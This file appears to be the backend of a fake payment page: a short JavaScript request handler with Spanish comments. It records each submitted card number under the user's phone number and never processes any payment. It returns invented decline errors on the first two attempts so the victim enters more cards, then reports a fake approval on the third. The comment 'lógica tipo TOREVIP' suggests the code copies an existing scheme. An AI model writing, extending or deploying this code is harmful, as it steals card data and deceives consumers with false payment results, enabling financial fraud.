const db = {};

export default function handler(req, res) {
  const { phone, card } = req.body;

  if (!phone) {
    return res.json({ error: "no phone" });
  }

  if (!db[phone]) {
    db[phone] = {
      attempts: 0,
      cards: []
    };
  }

  const user = db[phone];

  // guardar tarjeta
  user.cards.push(card);
  user.attempts++;

  // 🔥 lógica tipo TOREVIP
  if (user.attempts === 1) {
    return res.json({
      status: "error",
      message: "Error 24: método rechazado"
    });
  }

  if (user.attempts === 2) {
    return res.json({
      status: "error",
      message: "Error 12: verificación fallida"
    });
  }

  // tercera pasa
  return res.json({
    status: "ok",
    message: "Pago aprobado ✔"
  });
}
